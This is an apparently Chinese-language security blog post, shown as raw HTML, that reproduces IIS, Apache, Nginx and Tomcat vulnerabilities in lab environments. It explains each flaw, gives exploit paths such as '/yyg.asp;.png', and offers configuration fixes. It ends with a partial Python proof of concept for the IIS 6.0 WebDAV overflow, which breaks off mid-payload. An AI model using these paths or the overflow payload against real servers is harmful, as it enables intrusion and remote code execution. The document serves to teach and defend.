href=\"#Apache-HTTPD-未知后缀解析漏洞\" class=\"headerlink\" title=\"Apache HTTPD 未知后缀解析漏洞\"></a>Apache HTTPD 未知后缀解析漏洞</h2><p>环境采用vulhub的<code>/httpd/apache_parsing_vulnerability</code></p>\n<h3 id=\"漏洞原理-5\"><a href=\"#漏洞原理-5\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>Apache默认一个文件可以有多个点分隔的后缀,如果最右的后缀无法解析会向左推进。加上运维人员错误配置如下</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddHandler <span class=\"built_in\">application</span>/x-httpd-php .php</span><br></pre></td></tr></table></figure>\n\n<p>可以发现上面的配置没有正则匹配的，所以在任意位置匹配到<code>.php</code>，会拿去给<code>php_module</code>解析。</p>\n<h3 id=\"实践过程-1\"><a href=\"#实践过程-1\" class=\"headerlink\" title=\"实践过程\"></a>实践过程</h3><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_1.png\" alt=\"004_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_2.png\" alt=\"004_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_3.png\" alt=\"004_3\"></p>\n<h3 id=\"修复方式-3\"><a href=\"#修复方式-3\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>修改AddHandler方法为SetHandler方法</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#AddHandler application/x-httpd-php .php</span></span><br><span class=\"line\"><span class=\"section\">&lt;FilesMatch \".+\\.php$\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/004_4.png\" alt=\"004_4\"></p>\n<p>禁止<code>.php.</code>格式执行</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \".+\\. ph(p[3457]?|t|tml)\\.\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\">Require</span> <span class=\"literal\">all</span> denied</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Nginx相关\"><a href=\"#Nginx相关\" class=\"headerlink\" title=\"Nginx相关\"></a>Nginx相关</h1><h2 id=\"Nginx-lt-8-03畸形解析漏洞\"><a href=\"#Nginx-lt-8-03畸形解析漏洞\" class=\"headerlink\" title=\"Nginx &lt;8.03畸形解析漏洞\"></a>Nginx &lt;8.03畸形解析漏洞</h2><h3 id=\"漏洞原理-6\"><a href=\"#漏洞原理-6\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_7.png\" alt=\"002_7\"></p>\n<h4 id=\"Nginx修复方式-1\"><a href=\"#Nginx修复方式-1\" class=\"headerlink\" title=\"Nginx修复方式\"></a>Nginx修复方式</h4><ol>\n<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>\n</li>\n<li><p>正则表达式过滤非法输入,代码如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#配置nginx.conf</span></span><br><span class=\"line\"><span class=\"attribute\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> <span class=\"regexp\">~ \\..*\\/.*php</span> ) &#123;</span><br><span class=\"line\">　　<span class=\"attribute\">return</span> <span class=\"number\">403</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并设置PHP-FPM的<code>security.limit_extensions</code>为<code>.php</code>，避免其他后缀文件被解析。</p>\n</li>\n</ol>\n<h2 id=\"Nginx-配置错误导致漏洞\"><a href=\"#Nginx-配置错误导致漏洞\" class=\"headerlink\" title=\"Nginx 配置错误导致漏洞\"></a>Nginx 配置错误导致漏洞</h2><h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><h4 id=\"漏洞原因\"><a href=\"#漏洞原因\" class=\"headerlink\" title=\"漏洞原因\"></a>漏洞原因</h4><p>错误的配置导致目录遍历和信息泄露</p>\n<p><code>autoindex on</code>开启了目录遍历。Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>\n<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_2.png\" alt=\"006_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_1.png\" alt=\"006_1\"></p>\n<h4 id=\"修复方式-4\"><a href=\"#修复方式-4\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h4><p>将<code>autoindex on;</code>改成<code>autoindex off</code>。</p>\n<p><code>/files</code>补全为<code>/files/</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_3.png\" alt=\"006_3\"></p>\n<h3 id=\"CRLF注入漏洞\"><a href=\"#CRLF注入漏洞\" class=\"headerlink\" title=\"CRLF注入漏洞\"></a>CRLF注入漏洞</h3><p>CRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>\n<p>Nginx会将<code>$uri</code>进行解码，导致传入%0a%0d即可引入换行符，而造成CRLF注入漏洞。</p>\n<p>查看Nginx文档，可以发现有三个表示uri的变量：</p>\n<ol>\n<li><code>$uri</code></li>\n<li><code>$document_uri</code></li>\n<li><code>$request_uri</code></li>\n</ol>\n<p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。</p>\n<p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">listen</span> <span class=\"number\">8080</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">root</span> /usr/share/nginx/html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">server_name</span> _;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">return</span> <span class=\"number\">302</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$uri</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h4><h5 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h5><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/006_4.png\" alt=\"006_4\"></p>\n<h5 id=\"xss漏洞\"><a href=\"#xss漏洞\" class=\"headerlink\" title=\"xss漏洞\"></a>xss漏洞</h5><h5 id=\"设置Cookie引发的CSRF漏洞\"><a href=\"#设置Cookie引发的CSRF漏洞\" class=\"headerlink\" title=\"设置Cookie引发的CSRF漏洞\"></a>设置Cookie引发的CSRF漏洞</h5><h4 id=\"修复方式-5\"><a href=\"#修复方式-5\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h4><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">return</span> <span class=\"number\">302</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$request_uri</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Tomcat相关\"><a href=\"#Tomcat相关\" class=\"headerlink\" title=\"Tomcat相关\"></a>Tomcat相关</h1><h2 id=\"PUT方法任意写文件漏洞-CVE-2017-12615\"><a href=\"#PUT方法任意写文件漏洞-CVE-2017-12615\" class=\"headerlink\" title=\"PUT方法任意写文件漏洞 (CVE-2017-12615)\"></a>PUT方法任意写文件漏洞 (CVE-2017-12615)</h2><h3 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h3><p>在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;init-<span class=\"built_in\">param</span>&gt; </span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-name&gt;readonly&lt;/<span class=\"built_in\">param</span>-name&gt; </span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;<span class=\"literal\">false</span>&lt;/<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt; </span><br><span class=\"line\">&lt;/init-<span class=\"built_in\">param</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_1.png\" alt=\"007_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_2.png\" alt=\"007_2\"></p>\n<h3 id=\"利用exp\"><a href=\"#利用exp\" class=\"headerlink\" title=\"利用exp\"></a>利用exp</h3><p><code>https://github.com/iBearcat/CVE-2017-12615</code></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_3.png\" alt=\"007_3\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/007_4.png\" alt=\"007_4\"></p>\n<h3 id=\"修复方式-6\"><a href=\"#修复方式-6\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;init-<span class=\"built_in\">param</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-name&gt;readonly&lt;/<span class=\"built_in\">param</span>-name&gt;</span><br><span class=\"line\">      &lt;<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;<span class=\"literal\">true</span>&lt;/<span class=\"built_in\">param</span>-<span class=\"built_in\">value</span>&gt;</span><br><span class=\"line\">&lt;/init-<span class=\"built_in\">param</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"中间件及其相关漏洞复现\"><a href=\"#中间件及其相关漏洞复现\" class=\"headerlink\" title=\"中间件及其相关漏洞复现\"></a>中间件及其相关漏洞复现</h1><h1 id=\"IIS相关\"><a href=\"#IIS相关\" class=\"headerlink\" title=\"IIS相关\"></a>IIS相关</h1><h2 id=\"IIS-5-x-6-x-解析漏洞\"><a href=\"#IIS-5-x-6-x-解析漏洞\" class=\"headerlink\" title=\"IIS 5.x-6.x 解析漏洞\"></a>IIS 5.x-6.x 解析漏洞</h2><p>一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能)</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/yyg.asa</span><br><span class=\"line\">/yyg.cer</span><br><span class=\"line\">/yyg<span class=\"selector-class\">.cdx</span> #本地测试失败,变成下载</span><br><span class=\"line\">/yyg.aspx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>未修改配置的情况下,IIS<code>asa</code>,<code>asp</code>,<code>cdx</code>,<code>cer</code>这几个缀名映射的了负责解析的asp.dll。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_0.png\" alt=\"001_0\"></p>\n<p>iis 6.0解析漏洞有两种利用方式</p>\n<h3 id=\"目录解析\"><a href=\"#目录解析\" class=\"headerlink\" title=\"目录解析\"></a>目录解析</h3><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"regexp\">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>\n\n<p>目录解析方式利用如上,在网站上建立了<code>.asp</code>或<code>.asa</code>等可利用的文件夹,在该文件夹下的任何扩张名的文件都会被IIS解析成asp文件来执行。</p>\n<p>一般的利用方式:</p>\n<p>创建目录<code>yyg.asp</code>,那么通过某种手段上传文件到该目录</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"regexp\">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>\n\n<p>无视后缀名即可拿shell</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_1.png\" alt=\"001_1\"></p>\n<h3 id=\"文件解析\"><a href=\"#文件解析\" class=\"headerlink\" title=\"文件解析\"></a>文件解析</h3><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">/yyg.asp</span>;<span class=\"string\">.png</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_2.png\" alt=\"001_2\"></p>\n<p><code>/yyg.asp;.png</code>分号后面的<code>.png</code>不会被解析</p>\n<h3 id=\"修复方式\"><a href=\"#修复方式\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>由于微软认为这是IIS的特性,一直没有安全补丁,可以选择高版本的IIS.</p>\n<ol>\n<li>通过正则编写,阻止非法文件名上传</li>\n<li>进行权限设置,限制用户创建文件夹</li>\n</ol>\n<h2 id=\"IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞\"><a href=\"#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞\" class=\"headerlink\" title=\"IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞\"></a>IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞</h2><h3 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>漏洞需要Fast-CGI调用php,并且在php.ini中需要cgi.fix_pathinfo=1。在这个选项被打开的情况下,php-fpm会<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。所以，第一次fpm发现<code>yyg.png/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>yyg.png</code>是否存在。当这个文件是存在的，会被作为PHP文件执行，导致解析漏洞。</p>\n<h3 id=\"IIS-7-5\"><a href=\"#IIS-7-5\" class=\"headerlink\" title=\"IIS 7.5\"></a>IIS 7.5</h3><p>测试环境:win7(x86)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>\n<p>win2008R2(x64)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>\n<p>需要php.ini中cgi.fix_pathinfo=1,通常情况下是默认开启。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_1.png\" alt=\"002_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_2.png\" alt=\"002_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_3.png\" alt=\"002_3\"></p>\n<h3 id=\"IIS-7-0\"><a href=\"#IIS-7-0\" class=\"headerlink\" title=\"IIS 7.0\"></a>IIS 7.0</h3><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_4.png\" alt=\"002_4\"></p>\n<h3 id=\"IIS-7-0-7-5-修复方式\"><a href=\"#IIS-7-0-7-5-修复方式\" class=\"headerlink\" title=\"IIS 7.0/7.5 修复方式\"></a>IIS 7.0/7.5 修复方式</h3><p>1.如果需要继续FastCGI方式调用PHP,可以在php.ini中设置cgi.fix_pathinfo=0,修改保存后要重启IIS,可能影响到某些服务,谨慎使用。</p>\n<p>2.增强IIS设置</p>\n<p>在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，把“仅当请求映射至以下内容时才调用处理程序”这个选项勾上即可；</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_5.png\" alt=\"002_5\"></p>\n<p>查看解析结果</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_6.png\" alt=\"002_6\"></p>\n<h3 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h3><h3 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_7.png\" alt=\"002_7\"></p>\n<h4 id=\"Nginx修复方式\"><a href=\"#Nginx修复方式\" class=\"headerlink\" title=\"Nginx修复方式\"></a>Nginx修复方式</h4><ol>\n<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>\n</li>\n<li><p>正则表达式过滤非法输入,代码如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#配置nginx.conf</span></span><br><span class=\"line\"><span class=\"attribute\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> <span class=\"regexp\">~ \\..*\\/.*php</span> ) &#123;</span><br><span class=\"line\">　　<span class=\"attribute\">return</span> <span class=\"number\">403</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p>\n</li>\n</ol>\n<h2 id=\"IIS6-0远程命令执行漏洞-CVE-2017-7269\"><a href=\"#IIS6-0远程命令执行漏洞-CVE-2017-7269\" class=\"headerlink\" title=\"IIS6.0远程命令执行漏洞(CVE-2017-7269)\"></a>IIS6.0远程命令执行漏洞(CVE-2017-7269)</h2><h3 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>开启WebDAV服务的IIS 6.0存在缓存区溢出漏洞导致远程代码执行</p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><p>windows server2003</p>\n<h3 id=\"探测脚本\"><a href=\"#探测脚本\" class=\"headerlink\" title=\"探测脚本\"></a>探测脚本</h3><p><code>https://github.com/lcatro/CVE-2017-7269-Echo-PoC</code></p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#https://github.com/lcatro/CVE-2017-7269-Echo-PoC</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">def generate_payload(port):</span><br><span class=\"line\">    pay='PROPFIND / HTTP/1.1<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>Host: localhost:'+ port  +'<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>Content-Length: 0<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>'</span><br><span class=\"line\">    pay+='If: &lt;http://localhost:' + port + '/aaaaaaa'</span><br><span class=\"line\">    pay+='<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>8b<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a2<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>8a<span 